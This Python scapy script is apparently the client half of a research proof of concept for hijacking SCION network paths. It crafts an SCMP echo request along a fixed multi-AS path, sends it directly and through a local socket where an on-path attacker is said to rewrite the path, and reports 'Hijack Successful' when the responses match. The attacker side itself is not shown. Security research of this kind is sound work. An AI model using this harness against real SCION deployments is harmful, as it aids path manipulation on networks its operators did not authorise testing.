import socket
import sys
sys.path.append("./scapy-scion-int")
import time
from typing import List, Optional, Tuple, Union
import signal
import json
import subprocess
from scapy_scion.layers.scmp import SCMP, EchoRequest
from scapy_scion.layers.scion import SCION, UDP, SCIONPath
from scapy.all import bind_layers, sniff, sr1, conf, L3RawSocket, IP, Ether, sr, srp, srp1, StreamSocket, Raw, SimpleSocket
from scapy_scion.utils import capture_path
import pathlib
import pprint

from poc import fetch_paths, choose_path

br_port = 30042
br_addr = "192.168.111.1"
br_iface = "eth1"  # interface to borderrouter


def client():
    """
    This function represents the client side of a SCION network communication.
    It sends a custom SCION packet to a destination address on a specific path. 
    The client sends the packet twice, once WITHOUT and once WITH modification of SCION path (done by attacker on the other side of the socket = on path attacker).
    The path can be hijacked successfully, when the response is the same both times.

    Args:
        None

    Returns:
        None
    """
    
    dstISD = 64
    dstAS = "2:0:2c"
    dst_IA = f"{dstISD}-{dstAS}"

    paths = fetch_paths(dst_IA)

    sequence1 = "64-2:0:2b#0,1 64-559#24,21 64-15623#8,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0"

    SCION_path1 = choose_path(dst_IA, paths, sequence=sequence1)

    dstAddr = "192.168.110.1"
    bind_layers(UDP, SCION, dport=br_port)
    bind_layers(UDP, SCION, sport=br_port)
    myIP = IP()
    myIP.src = "192.168.111.25"
    # myIP.src = "127.0.0.1"
    myIP.dst = br_addr # address of border router (NOT! actual destination address)
    # myIP.flags = "DF" # Don't fragment (less important?)

    myUDP = UDP()
    myUDP.sport = 30041
    myUDP.dport = br_port

    mySCION = SCION_path1
    mySCION.SrcISD = 64
    mySCION.SrcAS = "2:0:2b"
    mySCION.PathType = 1
    mySCION.DstHostAddr = dstAddr
    mySCION.SrcHostAddr = "192.168.111.25"
    # mySCION.SrcHostAddr = "127.0.0.1"

    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))

    p = myIP/myUDP/mySCION/mySCMP

    del p[IP].len
    del p[IP].chksum
    del p[UDP].len
    del p[UDP].chksum
    del p[SCION].NextHdr
    del p[SCION].HdrLen
    del p[SCION].PayloadLen
    p.show2()
    # p.pdfdump("output/sent_packet.pdf")

    host = socket.gethostname()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 12345))
    ss = SimpleSocket(s, IP)

    original = sr1(p, iface=br_iface, timeout=1)
    resp = ss.sr1(p, timeout=1)

    # resp.pdfdump("output/received_packet.pdf")

    if bytes(resp) != bytes(original):
        print("Original: ")
        original.show()
        print("Response: ")
        resp.show()
        print("Response is different from original")
    else:
        print("======================================")
        print("===Response is the same as original===")
        print("========= Hijack Successful ==========")
        print("======================================")
    s.close()


if __name__ == "__main__":
    client()